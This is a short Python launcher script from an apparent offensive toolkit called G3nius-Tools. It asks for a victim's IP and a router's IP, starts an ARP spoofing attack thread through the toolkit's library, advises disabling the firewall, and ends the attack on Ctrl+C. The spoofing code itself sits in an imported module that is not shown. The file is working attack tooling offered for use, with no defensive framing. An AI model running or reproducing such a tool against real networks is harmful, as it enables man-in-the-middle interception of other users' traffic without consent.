# import G3nius-Tools
# coding: utf-8

"""     libs       """
# Internal
from lib.classes.gpl import gpl_input, gpl_confirm
from lib.classes.gpl import gpl_arp_spoof_thread, gpl_arp_spoof_end_attack_thread
from lib.classes.gpl import gpl_clear_and_banner, gpl_set_banner_verion
from lib.classes.core import Error_Levels, Handler
# External
from threading import Thread

"""     ask     """
Target1_IP = gpl_input("Enter clinet IP address: ", get_ip=True)
Target2_IP = gpl_input("Enter router/clinet_2 IP address: ", get_ip=True)
Verbose = gpl_confirm("Run as verbose")

"""     attack      """
# Banner
gpl_set_banner_verion("2.0.0")
gpl_clear_and_banner()

# Attack
thread = Thread(target=gpl_arp_spoof_thread, args=(Target1_IP, Target2_IP, True, Verbose,))
thread.run()

# Wait for CTRL+C or CTRL+D
Handler(Error_Levels.Info, 'Note: Disable your firewall if is on.')
Handler(Error_Levels.Alert, 'Press CTRL+C to stop attack.')
while True:
    try:
        input()
    except (EOFError, KeyboardInterrupt):
        break

# Stop attack
gpl_arp_spoof_end_attack_thread()
